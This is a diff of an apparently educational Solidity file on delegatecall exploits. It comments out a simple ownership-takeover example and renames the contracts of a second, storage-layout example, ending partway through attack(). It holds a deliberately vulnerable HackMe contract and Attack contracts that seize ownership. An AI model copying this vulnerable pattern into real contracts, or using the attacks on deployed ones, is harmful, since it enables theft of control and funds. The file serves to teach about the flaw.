@@ -25,39 +25,39 @@ Therefore HackMe's storage was updated to msg.sender where msg.sender is the
 caller of HackMe, in this case Attack.
 */
 
-contract Lib {
-  address public owner;
+// contract Lib {
+//   address public owner;
 
-  function pwn() public {
-    owner = msg.sender;
-  }
-}
+//   function pwn() public {
+//     owner = msg.sender;
+//   }
+// }
 
-contract HackMe {
-  address public owner;
-  Lib public lib;
+// contract HackMe {
+//   address public owner;
+//   Lib public lib;
 
-  constructor(Lib _lib) {
-    owner = msg.sender;
-    lib = Lib(_lib);
-  }
+//   constructor(Lib _lib) {
+//     owner = msg.sender;
+//     lib = Lib(_lib);
+//   }
 
-  fallback() external payable {
-    address(lib).delegatecall(msg.data);
-  }
-}
+//   fallback() external payable {
+//     address(lib).delegatecall(msg.data);
+//   }
+// }
 
-contract Attack {
-  address public hackMe;
+// contract Attack {
+//   address public hackMe;
 
-  constructor(address _hackMe) {
-      hackMe = _hackMe;
-  }
+//   constructor(address _hackMe) {
+//       hackMe = _hackMe;
+//   }
 
-  function attack() public {
-      hackMe.call(abi.encodeWithSignature("pwn()"));
-  }
-}
+//   function attack() public {
+//       hackMe.call(abi.encodeWithSignature("pwn()"));
+//   }
+// }
 
 /*
 This is a more sophisticated version of the previous exploit.
@@ -78,7 +78,7 @@ The second call to doSomething() calls Attack.doSomething() and here we
 change the owner.
 */
 
-contract Lib1 {
+contract Lib {
   uint public someNumber;
 
   function doSomething(uint _num) public {
@@ -86,7 +86,7 @@ contract Lib1 {
   }
 }
 
-contract HackMe1 {
+contract HackMe {
   address public lib;
   address public owner;
   uint public someNumber;
@@ -101,17 +101,17 @@ contract HackMe1 {
   }
 }
 
-contract Attack1 {
+contract Attack {
   //Make sure the storage layout is the same as HackMe
   //This will allow us to correctly update the state variables
   address public lib;
   address public owner;
   uint public someNumber;
 
-  HackMe1 public hackMe;
+  HackMe public hackMe;
 
-  constructor(HackMe1 _hackMe) {
-    hackMe = HackMe1(_hackMe);
+  constructor(HackMe _hackMe) {
+    hackMe = HackMe(_hackMe);
   }
 
   function attack() public {
